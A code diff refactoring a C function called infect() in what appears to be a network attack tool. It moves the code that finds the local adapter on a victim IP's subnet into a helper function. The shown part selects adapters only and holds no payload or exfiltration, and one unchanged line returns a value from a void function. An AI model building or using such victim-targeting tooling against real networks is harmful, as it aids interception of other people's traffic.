@@ -234,11 +234,10 @@ void infect()
 {
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
-	ULONG netmask, host;
+	uint32_t netmask;
 
 	pcap_t* fp;
 	pcap_if_t* alldevs = NULL, * adapter;
-	pcap_addr_t* addr;
 
 	char filter[100] = {0};
 	struct in_addr n_addr;
@@ -260,27 +259,12 @@ void infect()
 	if (!pAdapterInfo || !alldevs)
 		return -1;
 
+	/* get system adapters */
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 
-	for (adapter = alldevs; adapter; adapter = adapter->next)
-	{
-		int found = 0; //false
-		for (addr = adapter->addresses; addr; addr = addr->next)
-		{
-			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
-			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;
-
-			if ((host & netmask) == (infect_params.victim_ip & netmask))
-			{
-				found = 1; //true
-				break;
-			}
-		}
-		if (found)
-			break;
-	}
-
-	if (!adapter)
+	/* find the corresponding adapter to the victim */
+	netmask = v_adapter(alldevs, &adapter, infect_params.victim_ip);
+	if (adapter == NULL)
 		return;
 
 	/*open the adapter*/
